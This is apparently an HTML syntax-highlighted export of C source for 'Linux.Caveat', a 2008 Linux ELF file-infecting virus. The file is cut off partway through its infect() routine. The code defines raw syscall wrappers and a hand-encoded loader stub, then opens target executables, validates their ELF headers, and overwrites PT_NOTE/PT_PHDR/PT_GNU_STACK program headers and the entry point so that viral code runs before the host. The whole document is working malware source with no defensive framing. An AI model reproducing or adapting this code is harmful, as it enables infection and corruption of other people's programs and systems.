<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
.sc19 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* Linux.Caveat (x) herm1t@vx.netlux.org, feb 2008 */</span><span class="sc0">
</span><span class="sc9">#include &lt;stdint.h&gt;
#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;asm/unistd.h&gt;
</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"fake_host: mov $1,%eax; sub %ebx,%ebx; int $0x80;"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">".globl _start"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"_start: add $40,%esp; call caveat; popa; push $fake_host; ret"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#define NULL        ((void*)0)
#define ASM     asm volatile
#define _SC(r,NR)   "push %1\npop %%eax\nint $0x80":"=a"(r):"i"(NR)
#define syscall0(NR)            \
({int r;ASM(_SC(r,NR));r; })
#define syscall1(NR,a)          \
({int r;ASM(_SC(r,NR),"b"((int)(a)));r;})
#define syscall2(NR,a,b)        \
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)));r;})
#define syscall3(NR,a,b,c)      \
({int r;ASM(_SC(r,NR),"b"((int)(a)),"c"((int)(b)),"d"((int)(c)));r;})
#define syscall6(NR,a,b,c,d,e,f)    \
({int r;ASM("push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp"  \
        :"=a"(r):"i"(NR),"b"((int)(a)), \
    "c"((int)(b)),"d"((int)(c)),"S"((int)(d)),"D"((int)(e)),"0"((int)(f)));r;})
#define exit(a)                 syscall1(1,  a)
#define read(a,b,c)             syscall3(3,  a,b,c)
#define write(a,b,c)            syscall3(4,  a,b,c)
#define open(a,b)               syscall2(5,  a,b)
#define close(a)                syscall1(6,  a)
#define creat(a,b)              syscall2(8,  a,b)
#define time(a)                 syscall1(13, a)
#define lseek(a,b,c)            syscall3(19, a,b,c)
#define rename(a,b)             syscall2(38, a,b)
#define readdir(a,b)            syscall2(89, a,b)
#define munmap(a,b)             syscall2(91, a,b)
#define ftruncate(a,b)          syscall2(93, a,b)
#define mprotect(a,b,c)         syscall3(125,a,b,c)
#define mmap(a,b,c,d,e,f)       syscall6(192,a,b,c,d,e,f)
</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">inline</span><span class="sc0"> </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dst</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">src</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc10">*(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">dst</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">src</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">self</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">loader</span><span class="sc10">[</span><span class="sc4">60</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ok</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uint8_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">uint32_t</span><span class="sc0"> </span><span class="sc11">old_entry</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">off</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ehdr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">phdr</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">ok</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">  
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x65786860</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x04</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x6c680000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x08</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x68652f66</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x65732f63</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x72702f68</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x14</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x29e3896f</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x18</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xe9056ac9</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x1c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define LOADER_JMP  28
</span><span class="sc0">    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x6880cd58</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define LOADER_OFF  36
</span><span class="sc0">    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x28</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x6a016a50</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x2c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x10006805</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x30</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x89510000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x34</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x585a6ae3</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x38</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0xe0ff80cd</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">_start</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">extern</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">virus_end</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc19">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">virus_end</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">_start</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">mmap</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PROT_READ</span><span class="sc10">|</span><span class="sc11">PROT_WRITE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAP_SHARED</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">uint32_t</span><span class="sc10">)</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0xfffff000</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error1</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">ehdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">*)</span><span class="sc11">m</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">phdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">*)(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*(</span><span class="sc11">uint32_t</span><span class="sc10">*)</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x464c457f</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_type</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ET_EXEC</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_machine</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EM_386</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_version</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">EV_CURRENT</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_ident</span><span class="sc10">[</span><span class="sc11">EI_OSABI</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ELFOSABI_NONE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">error2</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">munmap</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">l</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error1</span><span class="sc10">:</span><span class="sc0">     </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">off</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">l</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">4095</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xfffff000</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*(</span><span class="sc11">uint32_t</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">LOADER_OFF</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">off</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">old_entry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef  PARTS
</span><span class="sc0">    </span><span class="sc1">/* replace the PT_NOTE (in PHT) and .note.ABI-tag with loader */</span><span class="sc0">
    </span><span class="sc11">uint32_t</span><span class="sc0"> </span><span class="sc11">note</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_NOTE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">note</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">--;</span><span class="sc0">
            </span><span class="sc10">*(</span><span class="sc11">uint32_t</span><span class="sc10">*)(</span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">LOADER_JMP</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">note</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phoff</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">loader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">note</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">loader</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">28</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_entry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">m</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">ok</span><span class="sc10">++;</span><span class="sc0">           
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc0">    </span><span class="sc1">/* replace PT_PHDR/PT_GNU_STACK/PT_NOTE with loader */</span><span class="sc0">
    </span><span class="sc11">Elf32_Phdr</span><span class="sc0"> </span><span class="sc11">new_phdr</span><span class="sc10">[</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">new_phnum</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_phnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_LOAD</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_offset</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">base</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_vaddr</span><span class="sc10">;</span><span class="sc0">     
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_NOTE</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_PHDR</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">p_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">PT_GNU_STACK</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">memcpy</span><span class="sc10">(&amp;</span><span class="sc11">new_phdr</span><span class="sc10">[</span><span class="sc11">new_phnum</span><span class="sc10">++],</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">phdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Phdr</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
